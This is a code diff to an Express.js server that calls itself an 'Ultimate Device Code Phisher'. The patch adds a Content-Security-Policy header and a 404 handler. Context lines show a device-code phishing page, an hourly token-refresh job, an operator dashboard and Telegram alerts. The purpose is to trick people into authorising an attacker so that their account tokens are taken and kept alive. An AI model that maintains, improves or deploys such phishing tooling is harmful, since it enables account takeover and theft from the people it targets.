@@ -1,7 +1,8 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v3.2 – Visit Notifications
+// 🥔 ULTIMATE DEVICE CODE PHISHER v3.3 – CSP & 404 Fixes
 // ============================================================
-// Now sends Telegram notification on every page visit.
+// Now includes proper Content-Security-Policy headers and a
+// clean 404 handler to stop browser extension noise.
 // ============================================================
 
 const http = require('http');
@@ -305,6 +306,12 @@ setInterval(refreshTokens, 60 * 60 * 1000); // every hour
 const app = express();
 app.use(express.json());
 app.use(express.static('public'));
+
+// 🔥 NEW: Content-Security-Policy Header to fix favicon and asset loading
+app.use((req, res, next) => {
+    res.setHeader("Content-Security-Policy", "default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;");
+    next();
+});
 
 // Health
 app.get(['/', '/health'], (req, res) => {
@@ -670,6 +677,11 @@ app.get('/api/health', async (req, res) => {
     res.json(results);
 });
 
+// 🔥 NEW: Catch-all 404 handler to prevent "Cannot POST /..." extension errors
+app.use((req, res) => {
+    res.status(404).send('404 Not Found');
+});
+
 // ── Start HTTP server with WebSocket upgrade ──
 const server = http.createServer(app);
 
@@ -684,7 +696,7 @@ server.on('upgrade', (req, socket, head) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v3.2 running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v3.3 running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device  (serves device_code.html)`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
